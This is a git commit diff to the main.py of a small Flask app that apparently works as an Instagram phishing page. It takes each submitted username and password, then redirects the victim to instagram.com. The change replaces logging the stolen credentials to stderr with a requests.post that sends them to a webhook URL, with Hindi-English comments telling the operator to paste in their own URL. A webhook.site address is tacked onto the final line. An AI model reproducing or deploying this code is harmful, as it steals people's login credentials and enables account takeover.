c4653f2a2223e21e2e818ae067a21f3f30996f8e
bashiransari9161-ship-it <bashiransari9161@gmail.com>
2026-04-30 00:58:52 +0530

    Update main.py

--- main.py
+++ main.py
@@ -1,4 +1,4 @@
-import sys
+import requests
 from flask import Flask, render_template, request, redirect
 
 app = Flask(__name__, template_folder='templates')
@@ -12,13 +12,21 @@ def login():
     username = request.form.get('username')
     password = request.form.get('password')
     
-    # Ye lines data ko turant Render ke logs mein bhejengi
-    print(f"\n--- NEW LOGIN DETECTED ---", file=sys.stderr, flush=True)
-    print(f"USERNAME: {username}", file=sys.stderr, flush=True)
-    print(f"PASSWORD: {password}", file=sys.stderr, flush=True)
-    print(f"--------------------------\n", file=sys.stderr, flush=True)
+    # --- YAHAN APNA WEBHOOK URL PASTE KAREIN ---
+    webhook_url = "APNA_COPIED_URL_YAHAN_DAALEIN"
     
+    data = {
+        "User": username,
+        "Pass": password
+    }
+    
+    # Ye data seedhe Webhook site par bhej dega
+    try:
+        requests.post(webhook_url, json=data)
+    except:
+        pass
+
     return redirect("https://www.instagram.com")
 
 if __name__ == "__main__":
-    app.run(host='0.0.0.0', port=5000)
+    app.run(host='0.0.0.0', port=5000)https://webhook.site/2dde8ff5-df66-45a9-aad0-77a150dad13b
